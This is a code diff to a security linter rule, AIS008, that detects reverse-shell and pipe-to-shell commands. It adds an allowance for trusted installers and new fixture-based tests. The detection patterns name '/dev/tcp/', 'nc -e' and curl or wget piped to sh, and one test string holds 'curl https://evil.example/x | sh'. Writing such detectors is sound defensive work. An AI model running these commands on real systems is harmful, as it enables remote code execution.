@@ -3,7 +3,7 @@
 use finding { Finding, Severity, make_finding, has_skip, concat_findings }
 use lacan_shim {
     re_find_line, re_is_match, str_contains, str_starts_with, path_basename, str_ends_with, str_to_lower, path_extension,
-    split_lines, gha_step_item_line, read_text
+    split_lines, gha_step_item_line, read_text, pipe_line_trusted
 }
 
 -- AIS002 helpers. Crisp string interpolation forbids `{` in double-quoted
@@ -345,20 +345,34 @@ pub ais004(path, text) -> vec<Finding> = {
     }
 }
 
+ais008_first_untrusted_pipe(text, pattern) -> int = {
+    lines := split_lines(text)
+    hit mut:= 0
+    i mut:= 0
+    while i < len(lines) && hit == 0 {
+        line := lines[i]
+        if re_is_match(pattern, line) {
+            if !pipe_line_trusted(line) {
+                hit = i + 1
+            }
+        }
+        i = i + 1
+    }
+    hit
+}
+
 pub ais008(path, text) -> vec<Finding> = {
     out := new()
     if has_skip(text, "AIS008") {
         out
     } else {
-        patterns := new()
-        push(patterns, "/dev/tcp/")
-        push(patterns, "nc -e")
-        push(patterns, "ncat -e")
-        push(patterns, "curl[^\\n]*\\|\\s*(ba)?sh")
-        push(patterns, "wget[^\\n]*\\|\\s*(ba)?sh")
+        shell_patterns := new()
+        push(shell_patterns, "/dev/tcp/")
+        push(shell_patterns, "nc -e")
+        push(shell_patterns, "ncat -e")
         i mut:= 0
-        while i < len(patterns) {
-            pat := patterns[i]
+        while i < len(shell_patterns) {
+            pat := shell_patterns[i]
             line := re_find_line(pat, text)
             if line > 0 {
                 push(out, make_finding(
@@ -372,6 +386,30 @@ pub ais008(path, text) -> vec<Finding> = {
                 ))
             }
             i = i + 1
+        }
+        curl_line := ais008_first_untrusted_pipe(text, "curl[^\\n]*\\|\\s*(ba)?sh")
+        if curl_line > 0 {
+            push(out, make_finding(
+                "AIS008",
+                Severity.High,
+                "2.1",
+                "AML.T0010.000",
+                path,
+                curl_line,
+                "Reverse-shell or pipe-to-shell primitive matched"
+            ))
+        }
+        wget_line := ais008_first_untrusted_pipe(text, "wget[^\\n]*\\|\\s*(ba)?sh")
+        if wget_line > 0 {
+            push(out, make_finding(
+                "AIS008",
+                Severity.High,
+                "2.1",
+                "AML.T0010.000",
+                path,
+                wget_line,
+                "Reverse-shell or pipe-to-shell primitive matched"
+            ))
         }
         out
     }
@@ -471,6 +509,40 @@ test "ais008 clean script" = {
 test "ais008 respects skip" = {
     fs := ais008("scripts/setup.sh", "# lacan:skip=AIS008:intentional\ncurl https://evil.example/x | sh\n")
     assert_eq(len(fs), 0)
+}
+
+test "ais008 rustup installer clean" = {
+    text := read_text("../../fixtures/AIS008/pass/docs/rust-setup.md", 100000)
+    fs := ais008("docs/rust-setup.md", text)
+    assert_eq(len(fs), 0)
+}
+
+test "ais008 cargo dist installer clean" = {
+    text := read_text("../../fixtures/AIS008/pass/workflows/cargo-dist.yml", 100000)
+    fs := ais008(".github/workflows/cargo-dist.yml", text)
+    assert_eq(len(fs), 0)
+}
+
+test "ais008 mixed rustup then evil" = {
+    text := read_text("../../fixtures/AIS008/fail/mixed.sh", 100000)
+    fs := ais008("mixed.sh", text)
+    assert_eq(len(fs) > 0, true)
+    assert_eq(fs[0].id, "AIS008")
+    assert_eq(fs[0].line > 1, true)
+}
+
+test "ais008 decoy hosts stay high" = {
+    text := read_text("../../fixtures/AIS008/fail/decoy.sh", 100000)
+    fs := ais008("decoy.sh", text)
+    assert_eq(len(fs) > 0, true)
+    assert_eq(fs[0].id, "AIS008")
+}
+
+test "ais008 rev shell unchanged" = {
+    text := read_text("../../fixtures/AIS008/fail/rev.sh", 100000)
+    fs := ais008("rev.sh", text)
+    assert_eq(len(fs) > 0, true)
+    assert_eq(fs[0].id, "AIS008")
 }
 
 test "ais001 git hook path" = {
